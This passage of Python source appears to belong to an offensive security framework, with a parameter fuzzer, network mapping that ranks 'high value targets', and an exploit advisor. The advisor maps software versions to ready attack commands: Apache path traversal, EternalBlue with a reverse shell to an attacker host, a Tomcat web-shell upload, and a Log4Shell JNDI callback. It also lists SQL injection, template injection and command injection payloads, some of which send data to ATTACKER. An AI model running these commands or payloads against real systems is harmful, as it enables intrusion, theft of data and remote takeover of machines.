        Sends 3 normal requests and averages the results.
        """
        baselines = []
        for _ in range(3):
            try:
                analysis = await ProtocolAnalyzer.analyze_http(
                    url, method=method, timeout=10.0)
                baselines.append({
                    "status_code": analysis.status_code,
                    "body_size": analysis.body_size,
                    "response_time_ms": analysis.response_time_ms,
                })
            except Exception:
                pass

        if not baselines:
            return {"status_code": 200, "body_size": 0, "response_time_ms": 100}

        return {
            "status_code": baselines[0]["status_code"],
            "body_size": int(sum(b["body_size"] for b in baselines) / len(baselines)),
            "response_time_ms": sum(b["response_time_ms"] for b in baselines) / len(baselines),
            "samples": len(baselines),
        }

    async def fuzz_parameter(self, url: str, param_name: str,
                              vuln_type: str, method: str = "GET",
                              baseline: Optional[Dict] = None) -> List[FuzzResult]:
        """
        Fuzz a single parameter with payloads for a specific vulnerability type.
        Analyzes response differences to detect anomalies.
        """
        results = []
        payloads = self.PAYLOADS.get(vuln_type, {}).get("detection", [])

        for payload in payloads:
            try:
                # Build request URL/data
                parsed = urllib.parse.urlparse(url)
                if method.upper() == "GET":
                    # Inject into URL query
                    params = urllib.parse.parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    fuzz_url = urllib.parse.urlunparse(
                        parsed._replace(query=new_query))
                    analysis = await ProtocolAnalyzer.analyze_http(
                        fuzz_url, method="GET", timeout=10.0)
                else:
                    # POST data
                    post_data = urllib.parse.urlencode({param_name: payload})
                    analysis = await ProtocolAnalyzer.analyze_http(
                        url, method="POST", data=post_data, timeout=10.0,
                        headers={"Content-Type": "application/x-www-form-urlencoded"})

                fuzz_result = FuzzResult(
                    parameter=param_name,
                    payload=payload,
                    status_code=analysis.status_code,
                    body_size=analysis.body_size,
                    response_time_ms=analysis.response_time_ms,
                )

                # === ANOMALY DETECTION ===
                if baseline:
                    # 1. Status code change
                    if analysis.status_code != baseline["status_code"]:
                        if analysis.status_code == 500:
                            fuzz_result.anomaly = True
                            fuzz_result.anomaly_type = "server_error"
                            fuzz_result.evidence = f"Status changed: {baseline['status_code']} → 500"

                    # 2. Significant body size difference (>30%)
                    if baseline["body_size"] > 0:
                        size_diff = abs(analysis.body_size - baseline["body_size"])
                        if size_diff / baseline["body_size"] > 0.3:
                            fuzz_result.anomaly = True
                            fuzz_result.anomaly_type = "size_anomaly"
                            fuzz_result.evidence = (
                                f"Size: {baseline['body_size']} → {analysis.body_size} "
                                f"(diff: {size_diff})")

                    # 3. Time-based detection
                    time_diff = analysis.response_time_ms - baseline["response_time_ms"]
                    if time_diff > self.TIME_THRESHOLD * 1000:
                        fuzz_result.anomaly = True
                        fuzz_result.anomaly_type = "time_based"
                        fuzz_result.evidence = (
                            f"Time: {baseline['response_time_ms']:.0f}ms → "
                            f"{analysis.response_time_ms:.0f}ms (diff: {time_diff:.0f}ms)")

                # 4. Error pattern matching in response
                # We'd need the body here — for now check based on known patterns
                if analysis.status_code == 500 and vuln_type == "sqli":
                    fuzz_result.anomaly = True
                    fuzz_result.anomaly_type = "error_based_sqli"
                    fuzz_result.evidence = "500 error on SQL payload"

                if fuzz_result.anomaly:
                    results.append(fuzz_result)

                # Small delay to avoid rate limiting
                await asyncio.sleep(0.1)

            except Exception:
                continue

        return results

    async def smart_fuzz(self, url: str, depth: str = "deep",
                          vuln_types: Optional[List[str]] = None,
                          method: str = "GET") -> FuzzReport:
        """
        Full intelligent fuzzing pipeline:
        1. Discover parameters
        2. Establish baselines
        3. Fuzz each parameter with context-appropriate payloads
        4. Analyze and report
        """
        report = FuzzReport(target=url)

        # Step 1: Discover parameters via HTTP analysis
        http_analysis = await ProtocolAnalyzer.analyze_http(url)
        report.technologies_detected = [t["name"] for t in http_analysis.technologies]

        # Collect all fuzzable parameters
        params = http_analysis.parameters
        report.parameters_found = len(params)

        if not params:
            # If no params found in page, try common ones
            params = [
                {"name": "id", "type": "url_query"},
                {"name": "page", "type": "url_query"},
                {"name": "search", "type": "url_query"},
                {"name": "q", "type": "url_query"},
                {"name": "url", "type": "url_query"},
                {"name": "file", "type": "url_query"},
                {"name": "path", "type": "url_query"},
                {"name": "redirect", "type": "url_query"},
            ]

        # Step 2: Establish baseline
        report.baseline = await self.establish_baseline(url, params, method)

        # Step 3: Select vulnerability types to test
        if vuln_types is None:
            vuln_types = ["sqli", "xss", "ssti", "lfi", "cmdi"]
            # Adapt based on detected tech
            if any("php" in t.lower() for t in report.technologies_detected):
                vuln_types.insert(0, "lfi")  # PHP → prioritize LFI
            if any("api" in t.lower() or "graphql" in t.lower()
                   for t in report.technologies_detected):
                vuln_types.insert(0, "sqli")  # API → prioritize SQLi
            # Add SSRF if URL parameters detected
            if any(p["name"] in ["url", "uri", "path", "redirect", "next", "return",
                                   "callback", "fetch", "proxy", "href", "link"]
                   for p in params):
                vuln_types.append("ssrf")
                vuln_types.append("open_redirect")

        # Step 4: Fuzz each parameter
        # Limit based on depth
        max_params = {"stealth": 3, "light": 5, "deep": 10, "aggressive": len(params)}
        limit = max_params.get(depth, 10)
        params_to_test = params[:limit]

        for param in params_to_test:
            for vuln_type in vuln_types:
                anomalies = await self.fuzz_parameter(
                    url, param["name"], vuln_type, method, report.baseline)
                report.anomalies.extend(anomalies)
                report.total_requests += len(
                    self.PAYLOADS.get(vuln_type, {}).get("detection", []))

        # Step 5: Convert anomalies to vulnerability findings
        vuln_map: Dict[str, List[FuzzResult]] = defaultdict(list)
        for anomaly in report.anomalies:
            # Determine vuln type from payload
            for vtype, payload_sets in self.PAYLOADS.items():
                for category_payloads in payload_sets.values():
                    if isinstance(category_payloads, list) and anomaly.payload in category_payloads:
                        vuln_map[f"{anomaly.parameter}:{vtype}"].append(anomaly)
                        break

        for key, anomalies in vuln_map.items():
            param_name, vuln_type = key.rsplit(":", 1)
            confidence = min(len(anomalies) / 3.0, 1.0)  # 3 anomalies = high confidence
            if confidence >= 0.33:  # At least 1 anomaly
                report.vulnerabilities.append({
                    "parameter": param_name,
                    "vulnerability_type": vuln_type,
                    "confidence": round(confidence, 2),
                    "anomalies_count": len(anomalies),
                    "evidence": [a.evidence for a in anomalies[:3]],
                    "payloads_triggered": [a.payload for a in anomalies[:3]],
                })

        return report


# ════════════════════════════════════════════════════════════════════════
# SECTION 3: NETWORK INTELLIGENCE
# Topology mapping, OS fingerprinting, service correlation
# ════════════════════════════════════════════════════════════════════════

@dataclass
class NetworkNode:
    """A node in the network topology"""
    ip: str
    hostname: str = ""
    os: str = ""
    os_confidence: float = 0.0
    ttl: int = 0
    hops: int = 0
    ports: List[Dict[str, Any]] = field(default_factory=list)
    services: List[Dict[str, str]] = field(default_factory=list)
    role: str = ""  # router, server, workstation, firewall, load_balancer
    vulnerabilities: List[str] = field(default_factory=list)


class NetworkIntelligence:
    """
    Builds network topology and correlates findings across hosts.
    Understands: routing, firewalls, load balancers, network segmentation.
    """

    # Common service → expected port mapping
    SERVICE_PORTS = {
        "http": [80, 8080, 8000, 8888, 3000, 5000],
        "https": [443, 8443, 4443],
        "ssh": [22, 2222],
        "ftp": [21, 2121],
        "smtp": [25, 465, 587],
        "dns": [53],
        "mysql": [3306],
        "postgresql": [5432],
        "redis": [6379],
        "mongodb": [27017],
        "smb": [445, 139],
        "rdp": [3389],
        "ldap": [389, 636],
        "kerberos": [88],
        "mssql": [1433],
        "oracle": [1521],
        "elasticsearch": [9200, 9300],
        "docker": [2375, 2376],
        "kubernetes": [6443, 8443, 10250],
        "vnc": [5900, 5901],
    }

    # OS detection from TTL + other heuristics
    TTL_OS_MAP = [
        (range(1, 33), "Network device (very low TTL)"),
        (range(33, 65), "Linux/Unix"),
        (range(65, 129), "Windows"),
        (range(129, 256), "Solaris/AIX/Network device"),
    ]

    # Role detection based on services
    ROLE_PATTERNS = {
        "domain_controller": {"kerberos", "ldap", "dns", "smb"},
        "web_server": {"http", "https"},
        "database_server": {"mysql", "postgresql", "mssql", "oracle", "mongodb"},
        "mail_server": {"smtp", "imap", "pop3"},
        "file_server": {"smb", "ftp", "nfs"},
        "router": {"snmp"},
        "load_balancer": set(),  # Detected via other means
    }

    def __init__(self):
        self.nodes: Dict[str, NetworkNode] = {}
        self.topology_graph = nx.Graph() if HAS_NETWORKX else None
        self.subnets: Dict[str, List[str]] = defaultdict(list)

    def add_node(self, ip: str, **kwargs) -> NetworkNode:
        """Add or update a network node"""
        if ip not in self.nodes:
            self.nodes[ip] = NetworkNode(ip=ip, **kwargs)
        else:
            for k, v in kwargs.items():
                if v:
                    setattr(self.nodes[ip], k, v)

        # Track subnet
        try:
            net = ipaddress.ip_network(f"{ip}/24", strict=False)
            self.subnets[str(net)].append(ip)
        except ValueError:
            pass

        # Add to graph
        if self.topology_graph is not None:
            self.topology_graph.add_node(ip, **kwargs)

        return self.nodes[ip]

    def detect_os(self, tcp_analysis: TCPAnalysis) -> Tuple[str, float]:
        """Detect OS from TCP analysis results"""
        os_name = "Unknown"
        confidence = 0.0

        # TTL-based detection
        if tcp_analysis.ttl > 0:
            for ttl_range, os in self.TTL_OS_MAP:
                if tcp_analysis.ttl in ttl_range:
                    os_name = os
                    confidence = 0.5
                    break

        # Window size refinement
        for (ttl, win), os in ProtocolAnalyzer.OS_FINGERPRINTS.items():
            if (abs(tcp_analysis.ttl - ttl) <= 5 and
                    abs(tcp_analysis.window_size - win) < 1000):
                os_name = os
                confidence = 0.8
                break

        # Banner-based refinement
        banner = tcp_analysis.banner.lower()
        if "ubuntu" in banner or "debian" in banner:
            os_name = f"Linux ({banner.split()[0]})"
            confidence = 0.95
        elif "windows" in banner:
            os_name = "Windows"
            confidence = 0.9
        elif "openssh" in banner:
            os_name = "Linux/Unix (OpenSSH)"
            confidence = 0.7
        elif "microsoft" in banner:
            os_name = "Windows"
            confidence = 0.85

        return os_name, confidence

    def detect_role(self, node: NetworkNode) -> str:
        """Determine the role of a network node based on its services"""
        node_services = set(s.get("name", "").lower() for s in node.services)

        for role, required_services in self.ROLE_PATTERNS.items():
            if required_services and required_services.issubset(node_services):
                return role

        # Heuristic: many open ports → server
        if len(node.ports) > 10:
            return "server"
        elif len(node.ports) <= 2:
            return "workstation"

        return "unknown"

    def detect_firewall(self, results: List[TCPAnalysis]) -> Dict[str, Any]:
        """
        Detect firewall presence from TCP analysis patterns:
        - Mixed open/filtered = stateful firewall
        - All filtered = host-based firewall
        - RST on all = reject policy
        """
        states = [r.state for r in results]
        open_count = states.count("open")
        filtered_count = states.count("filtered")
        closed_count = states.count("closed")
        total = len(states)

        fw_info = {
            "detected": False,
            "type": "none",
            "confidence": 0.0,
            "evidence": [],
        }

        if filtered_count > 0 and open_count > 0:
            fw_info["detected"] = True
            fw_info["type"] = "stateful_firewall"
            fw_info["confidence"] = min(filtered_count / total, 0.95)
            fw_info["evidence"].append(
                f"{filtered_count}/{total} ports filtered (selective blocking)")

        elif filtered_count == total:
            fw_info["detected"] = True
            fw_info["type"] = "host_firewall_drop"
            fw_info["confidence"] = 0.9
            fw_info["evidence"].append("All ports filtered (DROP policy)")

        elif closed_count == total and total > 20:
            fw_info["detected"] = True
            fw_info["type"] = "host_firewall_reject"
            fw_info["confidence"] = 0.7
            fw_info["evidence"].append("All ports RST (REJECT policy)")

        # Check for load balancer (different TTLs for same IP)
        ttls = set(r.ttl for r in results if r.ttl > 0)
        if len(ttls) > 1:
            fw_info["evidence"].append(
                f"Multiple TTL values detected ({ttls}) — possible load balancer")

        return fw_info

    def get_attack_surface(self) -> Dict[str, Any]:
        """Generate attack surface report from all collected intelligence"""
        total_ports = sum(len(n.ports) for n in self.nodes.values())
        total_services = sum(len(n.services) for n in self.nodes.values())
        roles = [n.role for n in self.nodes.values() if n.role]

        # Identify high-value targets
        high_value = []
        for ip, node in self.nodes.items():
            if node.role == "domain_controller":
                high_value.append({"ip": ip, "reason": "Domain Controller", "priority": 1})
            elif node.role == "database_server":
                high_value.append({"ip": ip, "reason": "Database Server", "priority": 2})
            elif any(s.get("name") == "http" or s.get("name") == "https"
                     for s in node.services):
                high_value.append({"ip": ip, "reason": "Web Server", "priority": 3})

        return {
            "total_hosts": len(self.nodes),
            "total_ports": total_ports,
            "total_services": total_services,
            "subnets": dict(self.subnets),
            "roles": dict((k, roles.count(k)) for k in set(roles)),
            "high_value_targets": sorted(high_value, key=lambda x: x["priority"]),
            "attack_vectors": self._identify_attack_vectors(),
        }

    def _identify_attack_vectors(self) -> List[Dict[str, str]]:
        """Identify possible attack vectors based on topology"""
        vectors = []
        for ip, node in self.nodes.items():
            services = set(s.get("name", "").lower() for s in node.services)
            if "smb" in services:
                vectors.append({"target": ip, "vector": "SMB (EternalBlue, relay)",
                                "module": "network_dominator"})
            if "rdp" in services:
                vectors.append({"target": ip, "vector": "RDP (BlueKeep, brute force)",
                                "module": "credential_cracker"})
            if "ssh" in services:
                vectors.append({"target": ip, "vector": "SSH (brute force, key reuse)",
                                "module": "credential_cracker"})
            if "http" in services or "https" in services:
                vectors.append({"target": ip, "vector": "Web (SQLi, XSS, RCE)",
                                "module": "web_assault"})
            if "ldap" in services or "kerberos" in services:
                vectors.append({"target": ip, "vector": "AD (Kerberoast, AS-REP)",
                                "module": "ad_annihilator"})
            if "redis" in services or "mongodb" in services:
                vectors.append({"target": ip, "vector": "Unauthenticated DB",
                                "module": "exploit_engine"})
        return vectors


# ════════════════════════════════════════════════════════════════════════
# SECTION 4: CONTEXTUAL EXPLOIT ADVISOR
# Recommends exploits based on exact version, OS, architecture
# ════════════════════════════════════════════════════════════════════════

@dataclass
class ExploitRecommendation:
    """A contextualized exploit recommendation"""
    target: str
    service: str
    version: str
    vulnerability: str
    exploit_module: str  # metasploit module or tool command
    confidence: float
    requirements: List[str] = field(default_factory=list)
    payload_suggestion: str = ""
    alternative_tools: List[str] = field(default_factory=list)


class ExploitAdvisor:
    """
    Context-aware exploit selection engine.
    Given: service name, version, OS → recommends the most appropriate exploit
    with exact parameters, not just generic tool invocations.
    """

    # Service version → exploit mapping
    EXPLOIT_DB = {
        "openssh": {
            "7.2p2": {
                "cve": "CVE-2016-10009",
                "module": "exploit/multi/ssh/sshexec",
                "desc": "OpenSSH agent forwarding RCE",
                "confidence": 0.6,
            },
            "8.2p1": {
                "cve": "CVE-2020-15778",
                "module": "auxiliary/scanner/ssh/ssh_enumusers",
                "desc": "Username enumeration",
                "confidence": 0.8,
            },
        },
        "apache": {
            "2.4.49": {
                "cve": "CVE-2021-41773",
                "module": "exploit/multi/http/apache_normalize_path_rce",
                "desc": "Path traversal + RCE",
                "confidence": 0.95,
                "command": "curl -s 'http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd'",
            },
            "2.4.50": {
                "cve": "CVE-2021-42013",
                "module": "exploit/multi/http/apache_normalize_path_rce",
                "desc": "Path traversal bypass",
                "confidence": 0.95,
                "command": "curl -s 'http://TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'",
            },
        },
        "nginx": {
            "1.18.0": {
                "cve": "CVE-2021-23017",
                "module": "N/A (DNS resolver vuln)",
                "desc": "1-byte heap overwrite via DNS",
                "confidence": 0.4,
            },
        },
        "vsftpd": {
            "2.3.4": {
                "cve": "CVE-2011-2523",
                "module": "exploit/unix/ftp/vsftpd_234_backdoor",
                "desc": "Backdoor command execution",
                "confidence": 0.99,
                "command": "msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS TARGET; run'",
            },
        },
        "proftpd": {
            "1.3.5": {
                "cve": "CVE-2015-3306",
                "module": "exploit/unix/ftp/proftpd_modcopy_exec",
                "desc": "mod_copy RCE",
                "confidence": 0.9,
            },
        },
        "smb": {
            "1.0": {
                "cve": "CVE-2017-0144",
                "module": "exploit/windows/smb/ms17_010_eternalblue",
                "desc": "EternalBlue RCE",
                "confidence": 0.95,
                "command": "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS TARGET; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER; run'",
            },
        },
        "tomcat": {
            "8.5": {
                "cve": "CVE-2017-12617",
                "module": "exploit/multi/http/tomcat_jsp_upload_bypass",
                "desc": "JSP upload via PUT",
                "confidence": 0.7,
                "command": "curl -X PUT 'http://TARGET/shell.jsp/' -d '<%Runtime.getRuntime().exec(\"id\");%>'",
            },
            "9.0": {
                "cve": "CVE-2020-1938",
                "module": "exploit/multi/http/tomcat_ghostcat",
                "desc": "Ghostcat AJP file read/inclusion",
                "confidence": 0.85,
            },
        },
        "log4j": {
            "2.0": {
                "cve": "CVE-2021-44228",
                "module": "exploit/multi/http/log4shell_header_injection",
                "desc": "Log4Shell JNDI RCE",
                "confidence": 0.99,
                "command": "curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER/a}' http://TARGET/",
            },
        },
    }

    # Technology → common vulnerability patterns
    TECH_VULNS = {
        "wordpress": ["xmlrpc_brute", "plugin_vulns", "theme_vulns", "user_enum"],
        "drupal": ["drupalgeddon2 (CVE-2018-7600)", "drupalgeddon3"],
        "joomla": ["com_fields_sqli", "registration_bypass"],
        "spring": ["spring4shell (CVE-2022-22965)", "actuator_exposure", "spel_injection"],
        "django": ["debug_page_info_leak", "orms_sqli_bypass"],
        "laravel": ["debug_mode_rce", "ignition_rce (CVE-2021-3129)"],
        "rails": ["CVE-2019-5420 (secret key)", "mass_assignment"],
        "express": ["prototype_pollution", "path_traversal"],
        "nextjs": ["open_redirect", "ssrf_via_image"],
    }

    @classmethod
    def recommend(cls, service: str, version: str = "",
                  os: str = "", technologies: List[str] = None) -> List[ExploitRecommendation]:
        """
        Given service details, recommend specific exploits with commands.
        """
        recommendations = []
        service_lower = service.lower()
        technologies = technologies or []

        # Direct service version match
        if service_lower in cls.EXPLOIT_DB:
            service_exploits = cls.EXPLOIT_DB[service_lower]
            for ver_pattern, exploit_info in service_exploits.items():
                if version and ver_pattern in version:
                    rec = ExploitRecommendation(
                        target="",
                        service=service,
                        version=version,
                        vulnerability=f"{exploit_info['cve']} — {exploit_info['desc']}",
                        exploit_module=exploit_info["module"],
                        confidence=exploit_info["confidence"],
                        payload_suggestion=exploit_info.get("command", ""),
                    )
                    recommendations.append(rec)

        # Technology-based recommendations
        for tech in technologies:
            tech_lower = tech.lower()
            if tech_lower in cls.TECH_VULNS:
                for vuln in cls.TECH_VULNS[tech_lower]:
                    rec = ExploitRecommendation(
                        target="",
                        service=tech,
                        version="",
                        vulnerability=vuln,
                        exploit_module=f"Check: searchsploit {tech_lower}",
                        confidence=0.5,
                        alternative_tools=[f"nuclei -t {tech_lower}/", "searchsploit"],
                    )
                    recommendations.append(rec)

        # Generic service-level recommendations (always useful)
        generic_checks = {
            "http": [
                ExploitRecommendation(
                    target="", service="http", version="", confidence=0.7,
                    vulnerability="Web application vulnerabilities",
                    exploit_module="smart_fuzzer",
                    alternative_tools=["nikto", "nuclei", "sqlmap", "ffuf"],
                    payload_suggestion="smart_fuzzer.smart_fuzz(url, depth='deep')"),
            ],
            "ssh": [
                ExploitRecommendation(
                    target="", service="ssh", version="", confidence=0.6,
                    vulnerability="Weak credentials / key reuse",
                    exploit_module="hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET",
                    alternative_tools=["medusa", "ncrack", "patator"]),
            ],
            "smb": [
                ExploitRecommendation(
                    target="", service="smb", version="", confidence=0.8,
                    vulnerability="SMB enumeration + relay",
                    exploit_module="crackmapexec smb TARGET -u '' -p '' --shares",
                    alternative_tools=["enum4linux", "smbclient", "rpcclient"]),
            ],
        }

        if service_lower in generic_checks and not recommendations:
            recommendations.extend(generic_checks[service_lower])

        return recommendations

    @classmethod
    def get_payload_for_context(cls, vuln_type: str, technology: str = "",
                                 os: str = "") -> Dict[str, Any]:
        """
        Generate context-aware payload based on vulnerability type + tech stack.
        """
        payload_info = {
            "vuln_type": vuln_type,
            "technology": technology,
            "os": os,
            "payloads": [],
            "verification": "",
        }

        if vuln_type == "sqli":
            if "mysql" in technology.lower():
                payload_info["payloads"] = [
                    "' UNION SELECT @@version,user(),database()--",
                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
                    "' AND IF(1=1,SLEEP(3),0)--",
                ]
                payload_info["verification"] = "Look for MySQL version in response"
            elif "postgresql" in technology.lower():
                payload_info["payloads"] = [
                    "' UNION SELECT version(),current_user,current_database()--",
                    "';SELECT pg_sleep(3)--",
                    "' AND CAST((SELECT version()) AS int)--",
                ]
            elif "mssql" in technology.lower():
                payload_info["payloads"] = [
                    "' UNION SELECT @@version,DB_NAME(),SYSTEM_USER--",
                    "';WAITFOR DELAY '0:0:3'--",
                    "' AND 1=CONVERT(int,(SELECT @@version))--",
                ]
            else:
                payload_info["payloads"] = SmartFuzzer.PAYLOADS["sqli"]["detection"]

        elif vuln_type == "rce":
            if "linux" in os.lower() or "unix" in os.lower():
                payload_info["payloads"] = [
                    ";id", "$(id)", "`id`", "|id",
                    ";cat /etc/passwd", "$(cat /etc/passwd)",
                    ";curl ATTACKER/$(whoami)", # OOB
                ]
            elif "windows" in os.lower():
                payload_info["payloads"] = [
                    "&whoami", "|whoami", "$(whoami)",
                    "&type C:\\Windows\\win.ini",
                    "&ping -n 3 ATTACKER",  # OOB
                ]
            payload_info["verification"] = "Look for 'uid=' or username in response"

        elif vuln_type == "ssti":
            if "jinja2" in technology.lower() or "flask" in technology.lower():
                payload_info["payloads"] = [
                    "{{7*7}}", "{{config.items()}}",
                    "{{''.__class__.__mro__[2].__subclasses__()}}",
                    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                ]
            elif "twig" in technology.lower():
                payload_info["payloads"] = [
                    "{{7*7}}", "{{dump(app)}}",
                    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                ]
            elif "spring" in technology.lower() or "java" in technology.lower():
                payload_info["payloads"] = [
                    "${7*7}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
                    "__${T(java.lang.Runtime).getRuntime().exec('id')}__",
                ]
            else:
                payload_info["payloads"] = SmartFuzzer.PAYLOADS["ssti"]["detection"]

        return payload_info
